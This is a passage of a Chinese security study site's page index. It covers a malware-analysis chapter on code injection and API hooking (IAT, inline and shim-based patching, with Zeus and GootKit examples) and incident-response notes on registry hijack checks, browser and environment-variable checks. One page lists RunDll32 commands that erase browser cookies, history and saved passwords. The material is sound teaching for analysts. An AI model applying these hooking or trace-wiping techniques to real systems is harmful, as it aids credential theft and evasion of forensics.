恶意软件进程可能只是使用NtMapViewSection()来避免使用VirtualAllocEX()和WriteProcessMemory()将恶意可执行文件内容写入目标进程；这使得恶意软件可以将一段内存（包含恶意可执行文件）从自己的地址空间映射到目标进程的地址空间。除了前面描述的技术外，攻击者已经知道使用空心进程注入技术的不同变化。要了解这一点，请观看作者在黑帽会议上的演讲：https://www.youtube.com/watch?v=9L9I1T5QDg4或阅读相关博文：https://cysinfo.com/detecting-deceptive-hollowing-techniques/。\n4.钩子技术 到目前为止，我们已经看了不同的代码注入技术来执行恶意代码。攻击者将代码（主要是DLL，但也可以是可执行文件或shellcode）注入合法（目标）进程的另一个原因是为了勾住目标进程的API调用。一旦代码被注入到目标进程中，它就可以完全访问进程内存，并可以修改其组件。改变进程内存组件的能力允许攻击者替换IAT中的条目或修改API函数本身，这种技术被称为钩子。通过钩子API（hook api），攻击者可以控制程序的执行路径，并将其重新引导到他选择的恶意代码中。然后，该恶意函数可以：\n阻止合法应用程序（如安全产品）对API的调用。 监控和拦截传递给API的输入参数。 过滤从API返回的输出参数。 在本节中，我们将研究不同类型的钩子（hook）技术。\n4.1 IAT钩子（IAT Hook） 如前所述，IAT包含一个应用程序从DLLs导入的函数地址。在这种技术中，当一个DLL被注入到目标（合法）进程中后，被注入的DLL中的代码（Dllmain()函数）会钩住IAT中目标进程的入口。下面给出了用于执行这种钩子的步骤的高级概述：\n通过解析内存中的可执行镜像，找到IAT的位置。 确定要钩住的函数的入口。 用恶意函数的地址替换该函数的地址。 为了帮助你理解，让我们看看一个合法程序通过调用DeleteFileA()API来删除一个文件的例子。DeleteFileA()对象接受一个参数，即要删除的文件的名称。下面的截图显示了合法程序（在上钩之前），正常通过IAT确定DeleteFileA()的地址，然后在kernel32.dll中调用DeleteFileA()。\n当程序的IAT被钩住时，IAT中DeleteFileA()的地址被替换为恶意函数的地址，如下所示。现在，当合法程序调用DeleteFileA()时，该调用被重定向到恶意软件模块中的恶意函数。恶意函数然后调用原来的DeleteFileA()函数，以使它看起来一切正常。坐在中间的恶意函数可以阻止合法程序删除文件，或者监视参数（正在被删除的文件），然后采取一些其他动作。\n除了通常在调用原始函数之前发生的阻断和监控之外，恶意函数还可以过滤输出参数，这发生在重新调用之后。这样，恶意软件可以钩住显示进程、文件、驱动、网络端口等列表的API，并过滤输出，以躲避使用这些API函数的工具。\n对于使用这种技术的攻击者来说，其缺点是，如果程序使用运行时链接（动态链接），或者攻击者希望钩子的功能已经作为表的内容导入，此时它就不起作用。攻击者的另一个缺点是，IAT钩子很容易被发现。在正常情况下，IAT中的条目应该位于其相应模块的地址范围内。例如，DeleteFile()的地址应该在kernel32.dll的地址范围内。为了检测这种挂钩技术，安全产品可以识别IAT中不在其模块地址范围内的条目。在64位Windows上，一项名为PatchGuard的技术可以阻止对包括IAT在内的调用表进行修补。由于这些问题，恶意软件作者使用了一种略微不同的钩子技术，接下来将讨论这个问题。\n4.2 内联钩子inline hooking(内联修补) IAT钩子依赖于交换函数指针，而在内联钩子中，API函数本身被修改（打补丁）以将API重定向到恶意代码。与IAT钩子技术一样，这种技术允许攻击者拦截、监测和阻止特定应用程序的调用，并过滤输出参数。在内联钩子中，目标API函数的前几个字节（指令）通常被一个跳转语句所覆盖，该语句将程序控制重新引导到恶意代码。然后，恶意代码可以拦截输入参数，过滤输出，并将控制权重定向到原始函数。\n为了帮助你理解，让我们假设一个攻击者想钩住一个合法应用程序所做的DeleteFileA()函数调用。通常情况下，当合法应用程序的线程遇到对DeleteFileA()的调用时，该线程会从DeleteFileA()函数的起点开始执行，如下面所示。\n为了用跳转取代函数的前几条指令，恶意软件需要选择哪些指令来取代。jmp指令至少需要5个字节，所以恶意软件需要选择占用5个字节以上的指令。在上图中，替换前三条指令（使用不同颜色突出显示）是安全的，因为它们正好占用5个字节，而且，这些指令除了设置堆栈框架外，没有什么作用。在DeleteFileA()中要替换的三条指令被复制，然后用某种跳转语句替换，将控制权转移到恶意函数中。恶意函数做它想做的事，然后执行DeleteFileA()的原始三条指令，并跳回位于补丁下面的地址（在跳转指令下面），如下图所示。被替换的指令，连同返回目标函数的跳转语句，被称为蹦床。\n这种技术可以通过寻找API函数开始时的意外跳转指令来检测，但要注意的是，恶意软件可以通过在API函数中插入更深的跳转，而不是在函数开始时插入，从而使检测变得困难。而不是使用恶意软件可能会使用call指令，或push和ret指令的组合来重定向控制；这种技术可以绕过安全工具，因为安全工具只寻找jmp指令。 有了对内联钩子的了解，让我们来看看恶意软件（Zeus Bot）使用这种技术的例子。宙斯机器人钩住了各种API函数；其中之一是Internet Explorer（iexplore.exe）的HttpSendRequestA()。通过钩住这个函数，恶意软件可以从POST有效载荷中提取凭证。在挂钩之前，恶意的可执行文件（包含各种功能）被注入到Internet Explorer的地址空间。下面的截图显示了地址0x33D0000，可执行文件被注入其中。\n在注入可执行文件后，HttpSendRequestA()被钩住，将程序控制重定向到注入的可执行文件中的一个恶意函数。在我们看这个被钩住的函数之前，让我们看一下合法的HttpSendRequestA()函数的前几个字节（如图所示）。\n前三个指令（占用5个字节，在前面的截图中突出显示）被替换为重定向控制。下面的截图显示了挂钩后的HttpSendRequestA()。前三条指令被替换为jmp指令（占用5个字节）；注意跳转指令是如何将控制权重定向到地址为0x33DEC48的恶意代码上的，这属于注入的可执行程序的地址范围。\n4.3 使用Shim进行内存修补 在内联挂接中，我们看到了函数中的一系列字节是如何被修补以将控制权重定向到恶意代码的。使用应用程序兼容性垫片可以进行内存内修补（垫片的细节之前已经介绍过）。微软使用内存打补丁的功能来应用补丁来修复其产品中的漏洞。内存打补丁是一个没有记录的功能，在兼容性管理员工具中也没有（前面讲过），但是安全研究人员，通过逆向工程，已经弄清楚了内存打补丁的功能，并且开发了分析它们的工具。Jon Erickson的sdb-explorer（https://github.com/evil-e/sdb-explorer）和William Ballenthin的python-sdb（https://github.com/williballenthin/python-sdb）允许你通过分析 shim数据库（.sdb）文件。这些研究人员的以下演讲包含了关于内存补丁的详细信息，以及分析这些补丁的工具。\n持续使用和滥用微软的补丁: https://www.blackhat.com/docs/asia-14/materials/Erickson/WP-Asia-14-Erickson-Persist-It-Using-And-Abusing-Microsofts-Fix-It-Patches.pdf\n真正的Shim靠不住: http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf\n恶意软件作者使用内存补丁来注入代码和钩住API功能。使用内存打补丁的恶意软件样本之一是GootKit；这个恶意软件使用sdbinst工具安装各种垫片数据库（文件）。下面的截图显示了为多个应用程序安装的垫片，该截图显示了与explorer.exe相关的.sdb文件。\n安装的.sdb文件包含将被直接修补到目标进程内存中的shellcode。你可以使用sdb_dump_database.py脚本（python-sdb工具的一部分）来检查.sdb文件，命令如下。\n$ python sdb_dump_database.py {4c895e03-f7a5-4780-b65b-549b3fef0540}.sdb前面命令的输出显示恶意软件以explorer.exe为目标，并应用名为patchdata0的垫片。垫片名称下面的PATCH_BITS是一个原始的二进制数据，包含将被打入explorer.exe内存的shellcode。\n为了知道shellcode在做什么，我们需要能够解析PATCH_BITS，它是一个无文档的结构。为了解析这个结构，你可以使用sdb_dump_patch.py脚本（python-sdb的一部分），给出补丁名称，patchdata0，如图所示。\n$ python sdb_dump_patch.py {4c895e03-f7a5-4780-b65b-549b3fef0540\\}.sdb patchdata0运行前面的命令显示在explorer.exe内的kernel32.dll中应用的各种补丁。下面的截图显示了第一个补丁，它在相对虚拟地址（RVA）0x0004f0f2处匹配了两个字节，8B FF（mov edi,edi），并用EB F9（jmp 0x0004f0ed）替换它们。换句话说，它将控制权重定向到RVA 0x0004f0ed。\n下面的输出显示了在kernel32.dll的RVA 0x0004f0ed处应用的另一个补丁，恶意软件用调用0x000c61a4替换了一系列NOP指令，从而将程序控制重定向到RVA 0x000c61a4处的功能。这样，恶意软件修补了kernel32.dll中的多个位置，并进行了各种重定向，最终将其引向实际的shellcode。\n为了了解恶意软件在kernel32.dll中打了什么补丁，你可以将调试器连接到打了补丁的explorer.exe进程，并在kernel32.dll中找到这些补丁。例如，为了检查RVA 0x0004f0f2的第一个补丁，我们需要确定kernel32.dll被加载的基址。在我的例子中，它被加载在0x76730000，然后加上RVA 0x0004f0f2（换句话说，0x76730000 + 0x0004f0f2 = 0x7677f0f2）。下面的截图显示，这个 地址0x7677f0f2与API函数LoadLibraryW（）相关。\n检查LoadLibraryW()函数可以看到该函数开始时的跳转指令，该指令最终将把程序控制权转给shellcode。\n这种技术很有趣，因为在这种情况下，恶意软件没有直接分配内存或注入代码，而是依靠微软的shim功能来注入shellcode和钩住LoadLibraryW()API。它还通过跳转到kernel32.dll中的不同位置来使检测变得困难。\n5. 其他资源 除了本章介绍的代码注入技术外，安全研究人员还发现了其他各种注入代码的手段。以下是一些新的代码注入技术，以及进一步阅读的资源。\nATOMBOMBING: BRAND NEW CODE INJECTION FOR WINDOWS: https:// blog.ensilo.com/atombombing-brand-new-code-injection-for-windows\nPROPagate:* http://www.hexacorn.com/blog/2017/10/26/propagate-a-new- code-injection-trick/\nProcess Doppelgänging, by Tal Liberman and Eugene Kogan:* https://www.blackhat. com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process- Doppelganging.pdf\nGargoyle:* https://jlospinoso.github.io/security/assembly/c/cpp/ developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html\nGHOSTHOOK:* https://www.cyberark.com/threat-research-blog/ghosthook- bypassing-patchguard-processor-trace-based-hooking/\n在本章中，我们主要关注的是用户空间的代码注入技术；在内核空间也可以实现类似的功能（我们将在第11章中研究内核空间的钩子技术）。以下书籍应该能帮助你更深入地了解rootkit技术和Windows内部概念。\nThe Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System (2nd Edition), by Bill Blunden Practical Reverse Engineering: x86, x64, ARM, Windows Kernel, Reversing Tools, and Obfuscation, by Bruce Dang, Alexandre Gazet, and Elias Bachaalany Windows Internals (7th Edition), by Pavel Yosifovich, Alex Ionescu, Mark E. Russinovich, and David A. Solomon 总结 在本章中，我们研究了恶意程序用来在合法进程的上下文中注入和执行恶意代码的不同代码注入技术。这些技术允许攻击者执行恶意行为并绕过各种安全产品。除了执行恶意代码，攻击者还可以劫持合法进程调用的API函数（使用钩子），并将控制权重定向到恶意代码，以监视、阻止甚至过滤API的输出，从而改变程序的行为。在下一章中，你将学习攻击者为不被安全监控解决方案发现而使用的各种混淆技术。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析-9-代码注入和钩子",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-9-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8C%E9%92%A9%E5%AD%90/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "操作系统",
    "uri": "/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/index.html"
  },
  {
    "content": " 工具名 支持的系统 收费情况 支持挂恢复数据的格式 UFS explorer professional recovery win/mac/linux 收费 数据访问和恢复Windows: NTFS, FAT, FAT32, exFAT, ReFS/ReFS3;macOS: HFS+, APFS;Linux: Ext2, Ext3, Ext4, XFS, Extended format XFS, JFS, ReiserFS, UFS, UFS2, Adaptec UFS, big-endian UFS, Btrfs, F2FS;BSD/Solaris: ZFS volumes;VMware: VMFS, VMFS6.仅支持数据访问macOS: HFS;Novell: NWFS, NSS, NSS64;IBM/Microsoft: HPFS. DiskGenius win 收费 数据访问和恢复Windows: exFAT/GPT/NTFS（智能加载）Linux: EXT2/3/4（还支持分区恢复）虚拟磁盘 WinHEX win 收费 数据访问和恢复Windows: FAT12/16/32/NTFS/exFATLinux: Ext2/3/4, 本机支持Next3 ® , CDFS, UDF ",
    "description": "",
    "tags": null,
    "title": "数据恢复工具性能对比",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94/index.html"
  },
  {
    "content": "镜像劫持 映像劫持的定义 所谓的映像劫持（IFEO）就是Image File Execution Options/或字面直译 Image Hijack，\n劫持点1 Image File Execution Options镜像劫持 位于注册表的HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options里面exe被进行修改进行重定向的一个过程\n劫持点2 userinit镜像劫持 参考：https://blog.csdn.net/u013761036/article/details/53527490\n通过了解劫持过程可以知道这个劫持点利用的是windows系统服务启动用户初始化加载程序配置替换或插入自定义程序造成劫持\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\userinit.exe\n这里阅读下userinit的官方释义可知，userinit.exe的作用为：\n运行系统登录脚本\n重新建立网络连接\n当userinit.exe所指向的程序无法运行的时候，启动配置的HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\shell中设定的值，默认是explorer.exe\n这里有个提示：在修改HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\userinit.exe的时候，应包含userinit.exe\n但我们去掉c:\\windows\\system32\\userinit.exe，重启则会引起异常，所以这里一般都还会带上userinit.exe或者包含启动userinit.exe的脚本。通过运行启动userinit进入系统即可。\n劫持点3 shell镜像劫持 镜像劫持检查 针对IFEO劫持点检查 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options 对注册表进行检查，检查不一致的项目即可判断是否存在劫持。\n这里查看IFEO的值，我们直接一句话全读，然后一次审核每一项即可。通过阅读reg query语法可知/s递归查询,/t REG_SZ指定字符。\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /s /t REG_SZ 针对userinit和shell劫持点检查 这里由于userinit劫持点位于HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon根目录的属性中，因此不需要/s递归。\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /t REG_SZ ",
    "description": "",
    "tags": null,
    "title": "映像劫持检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "windows下浏览器相关检查 通常HKEY_LOCAL_MACHINE（计算机配置）配置权限大于HKEY_CURRENT_USER（当前用户）。这\t里尝试使用命令行查询所有IE浏览器相关的主页信息、搜索引擎信息、浏览历史等信息。\n计算机IE注册表配置查询 包括开始页面，默认页面，默认搜索，首页，搜索页，以及32位软件地址等。\nreg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\\Main\" ApplicationTileImmersiveActivation REG_DWORD 0x1 AssociationActivationMode REG_DWORD 0x0 AutoHide REG_SZ yes Start Page REG_SZ http://go.microsoft.com/fwlink/p/?LinkId=255141 # 开始页面 Anchor_Visitation_Horizon REG_BINARY 01000000 Cache_Percent_of_Disk REG_BINARY 0A000000 Default_Page_URL REG_SZ http://go.microsoft.com/fwlink/p/?LinkId=255141 # 默认页面 Default_Search_URL REG_SZ http://go.microsoft.com/fwlink/?LinkId=54896 # 默认搜索连接 Default_Secondary_Page_URL REG_MULTI_SZ Delete_Temp_Files_On_Exit REG_SZ yes Enable_Disk_Cache REG_SZ yes Extensions Off Page REG_SZ about:NoAdd-ons Local Page REG_SZ C:\\Windows\\System32\\blank.htm Placeholder_Height REG_BINARY 1A000000 Placeholder_Width REG_BINARY 1A000000 Search Page REG_SZ http://go.microsoft.com/fwlink/?LinkId=54896 Security Risk Page REG_SZ about:SecurityRisk Use_Async_DNS REG_SZ yes x86AppPath REG_SZ C:\\Program Files (x86)\\Internet Explorer\\IEXPLORE.EXE # 独立查询，可以使用/v + 值，如搜索main中的search page的值则可以这样搜索： reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\\Main\" /V \"Search Page\" # 如果要遍历main下面的所有键值则可以/s递归查询。 reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\\Main\" /s 当前用户IE注册表配置查询 reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\" HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main Anchor Underline REG_SZ yes Disable Script Debugger REG_SZ yes DisableScriptDebuggerIE REG_SZ yes Display Inline Images REG_SZ yes Do404Search REG_BINARY 01000000 Save_Session_History_On_Exit REG_SZ no Search Page REG_SZ http://go.microsoft.com/fwlink/?LinkId=54896 Show_FullURL REG_SZ no Show_StatusBar REG_SZ yes Show_ToolBar REG_SZ yes Show_URLinStatusBar REG_SZ yes Show_URLToolBar REG_SZ yes Use_DlgBox_Colors REG_SZ yes UseClearType REG_SZ no XMLHTTP REG_DWORD 0x1 Cache_Update_Frequency REG_SZ Once_Per_Session Local Page REG_SZ C:\\Windows\\system32\\blank.htm Enable Browser Extensions REG_SZ no Play_Background_Sounds REG_SZ yes Play_Animations REG_SZ yes Start Page REG_SZ http://go.microsoft.com/fwlink/?LinkId=625115 ImageStoreRandomFolder REG_SZ bxh3g4d OperationalData REG_QWORD 0x20d CompatibilityFlags REG_DWORD 0x0 SearchBandMigrationVersion REG_DWORD 0x1 FullScreen REG_SZ no Window_Placement REG_BINARY 2C0000000000000001000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF3A040000250200007A0A00000D060000 IE10RunOncePerInstallCompleted REG_DWORD 0x1 IE10RunOnceCompletionTime REG_BINARY A1D359E1A039D701 IE10TourShown REG_DWORD 0x1 IE10TourShownTime REG_BINARY A1D359E1A039D701 News Feed First Run Experience REG_DWORD 0x0 DownloadWindowPlacement REG_BINARY 2C0000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF2E020000A30000002E07000063040000 IE11EdgeNotifyTime REG_BINARY 1F473383CF8DD701 EdgeReminderRemainingCount REG_DWORD 0x4 IE11DefaultsFREConfigUpdateTimestamp REG_BINARY 00000000 Isolation REG_SZ PMIL SuppressScriptDebuggerDialog REG_DWORD 0x0 AllowSavingHistory REG_DWORD 0x1 ScriptDebugger_EnableHiddenTabs REG_DWORD 0x0 ApplicationTileImmersiveActivation REG_DWORD 0x1 AssociationActivationMode REG_DWORD 0x0 StatusBarWeb REG_DWORD 0x1 HideNewEdgeButton REG_DWORD 0x1 HideOpenWithEdgeInContextMenu REG_DWORD 0x0 ShowApplicationGuardFirstRunExperienceFromIE REG_DWORD 0x1 ForceGDIPlus REG_DWORD 0x0 AlwaysShowMenus REG_DWORD 0x0 ShutdownWaitForOnUnload REG_DWORD 0x0 DNSPreresolution REG_DWORD 0x8 SpellChecking REG_DWORD 0x1 LangToolsBroker REG_SZ {5bbd58bb-993e-4c17-8af6-3af8e908fca8} DisablePasswordReveal REG_DWORD 0x0 EnableLeakDetectionInEdge REG_DWORD 0x0 LastClosedWidth REG_DWORD 0x320 LastClosedHeight REG_DWORD 0x258 AllowPrinting REG_DWORD 0x1 AllowMixedModePrintingInPDF REG_DWORD 0x0 DisableRequiresActiveXPrompt REG_SZ EnableGetHostEnvironmentValue REG_DWORD 0x1 IE11DefaultsFRECompletionTime REG_BINARY 00000000 IE11DefaultsFREGPOCheckTimestamp REG_BINARY 00000000 PredictedViewExpansion REG_DWORD 0x64 PredictedViewChangeThreshold REG_DWORD 0xa PredictedViewChangeThresholdPaint REG_DWORD 0xa ContentLayerCacheExpansion REG_DWORD 0x12c RenderingLoopMaxTime REG_DWORD 0xfa NscSingleExpand REG_DWORD 0x0 Error Dlg Displayed On Every Error REG_SZ no Friendly http errors REG_SZ yes CSS_Compat REG_SZ doctype Expand Alt Text REG_SZ no Display Inline Videos REG_DWORD 0x1 Use Stylesheets REG_DWORD 0x1 SmoothScroll REG_DWORD 0x1 Show image placeholders REG_DWORD 0x0 Disable Diagnostics Mode REG_SZ no Move System Caret REG_SZ no Enable AutoImageResize REG_SZ yes UseThemes REG_DWORD 0x1 UseHR REG_DWORD 0x0 Q300829 REG_DWORD 0x0 Cleanup HTCs REG_DWORD 0x0 XDomainRequest REG_DWORD 0x1 DOMStorage REG_DWORD 0x1 EnableAlternativeCodec REG_SZ yes JScriptProfileCacheEventDelay REG_DWORD 0x1388 HideLocalHostIP REG_DWORD 0x0 CrossfadeMinTimeoutInMS REG_DWORD 0x7530 CrossfadeMaxTimeoutInMS REG_DWORD 0x7530 CrossfadeCurrentTimeoutInMS REG_DWORD 0x7530 ScrollTimeoutInMS REG_DWORD 0x1770 IsDrtTestRunning REG_SZ no DisableFirstRunCustomize REG_DWORD 0x0 IE10RunOnceLastShown REG_DWORD 0x0 IE10RunOnceLastShown_TIMESTAMP REG_BINARY 1FEC0438A693D601 IE10RecommendedSettingsNo REG_DWORD 0x0 EdgeReminderURL REG_SZ http://go.microsoft.com/fwlink/?LinkId=838604 EdgeReminderDuration REG_DWORD 0x1f FrameTabWindow REG_DWORD 0x1 AdminTabProcs REG_DWORD 0x1 SessionMerging REG_DWORD 0x1 FrameMerging REG_DWORD 0x1 CPLaunch REG_DWORD 0x0 HangRecovery REG_DWORD 0x1 DesktopTransparentCoverWindowTime REG_DWORD 0x8 TSEnable REG_DWORD 0x1 Isolation64Bit REG_DWORD 0x0 IsolationImmersive REG_SZ PMEM NoUpdateCheck REG_DWORD 0x1 Search Bar REG_SZ Preserve MinIEEnabled REG_DWORD 0x1 RefcountTracker REG_DWORD 0x0 TabDragOnSingleProc REG_DWORD 0x0 ForceBFCacheCandidacyPass REG_DWORD 0x0 Fasterback REG_DWORD 0x1 BackForwardInstrumentation REG_DWORD 0x0 FormSuggest PW Ask REG_SZ yes IsDRTRunning REG_SZ no SyncHomePage REG_BINARY Use FormSuggest REG_SZ no HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\ApplicationGuard HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\FeatureControl HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Touch HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\WindowsSearch查询IE历史记录 reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\typedurls\" inetcpl.cpl 偶尔遇到ie存在问题时，可以利用inetcpl.cpl快速打开internet管理页面\n利用InetCpl.cpl快速打开相关internet页面 Internet 属性，可有ItemNo参数 “常规”属性页 WinExec(‘RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,0’, SW_SHOWNORMAL);\nRunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,0\n“安全”属性页 WinExec(‘RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,1’, SW_SHOWNORMAL);\nRunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,1\n“内容”属性页 WinExec(‘RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,2’, SW_SHOWNORMAL);\nRunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,2\n“连接”属性页 WinExec(‘RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,3’, SW_SHOWNORMAL);\nRunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,3\n“程序”属性页 WinExec(‘RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,4’, SW_SHOWNORMAL); RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,4 “高级”属性页 WinExec(‘RunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,5’, SW_SHOWNORMAL);\nRunDLL32.exe Shell32.dll,Control_RunDLL InetCpl.cpl,,5\n利用InetCpl.cpl删除IE痕迹 清除临时文件emporary Internet Files\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8\n清除Cookies\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2\n清除历史History\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1\n清除表单Form Data\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16\n清除密码Passwords\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32\n清除所有Delete All\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255\n清除所有+所有插件Delete All – “Also delete files and settings stored by add-ons”\nRunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 4351\n",
    "description": "",
    "tags": null,
    "title": "浏览器相关检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9B%B8%E5%85%B3%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "渗透测试",
    "uri": "/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html"
  },
  {
    "content": "环境变量一般用于命令行快速执行命令，快速执行程序使用。恶意软件或黑客通常会通过一些环境变量设置，隐藏恶意程序，或添加恶意程序在环境变量中，用于实现对主机的控制。\nwindows环境变量检查 利用msinfo32 使用\nLinux环境变量文件介绍https://blog.csdn.net/pengjunlee/article/details/81585726\nwindows命令行提取环境变量 path linux环境变量检查 linux命令行提取环境变量 echo $PATH ",
    "description": "",
    "tags": null,
    "title": "环境变量检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "1. 现场勘查 一般包括询问、访问、观察情况记录，用于前期记录已知安全事件发生到发现后过程的细节。需要根据问答根据专业的角度判断哪些可以采纳哪些不可采纳哪些存在疑点有待后续确认。\n1.1. 现场询问 1.1.1. 现场询问的目的和意义： 由于应急响应均为事后处置相关内容，我们的目标是尽可能在有限的时间内找到攻击IP、取证分析、还原出攻击过程、甚至完成相关报告。因此在询问阶段应通过与现场人员的问答中得到我们分析需要的相关内容已节省时间，为了避免一些问题过于主观一般问题尽可能让现场人员回复客观的内容不限于：网络拓扑图是怎样？、事件发现过程是怎样？、目前排查下来的时间是什么时间？、目前有什么可疑的点吗？\n1.1.2. 现场询问的思路： 问网络框架 问其因经过结果 问关键线索 问是否已有怀疑方向线索，证据是什么，根据其判断是否合理采用，不严谨则不采用，仅记录 1.1.3. 一般询问内容可能包括： 客户的需求结果(需了解清楚客户具体要什么,得到一份关于什么的报告 客户的现场资源(例如可查看的主机,是否可安装我们的软件,是否可以连接外网 客户的出结果时间(交付应急报告的时间 1.1.4. **现场注意项: ** 先与销售确认客户的需求与销售已知的现场情况 客户提出的新需求先和销售对接确认后在和客户说是否做 1.2. 现场观察 应根据事件类型明确是什么类型的应急\n1.2.1. 案件类型应急 应保持现场保密，尤其是针对现场无法辨认可疑身份的人员应做到，少透露或避免透露应急或案件整体细节；还应对公司内部、对社会公众严格保密，遵守要求对案件敏感内容以及自身案件工作的保密。\n1.2.2. 一般安全事件应急 一般安全事件应急仍然需要保持事件敏感以及自身工作内容的敏感，防止因自己疏忽导致舆论以及公司名誉收到损伤。\n1.3. 信息收集基本记录 客户属性：如名称/区域/领域等 入侵范围：如主机数/网段等 入侵现象：如cpu过高，勒索界面，异常网络链接，安全设备告警等 客户需求：是否要求溯源，是否要求协助修复等\n1.4. 从始至总的基本原则 务必亲自求证，眼见为实耳听为虚 ",
    "description": "",
    "tags": null,
    "title": "现场看擦",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/index.html"
  },
  {
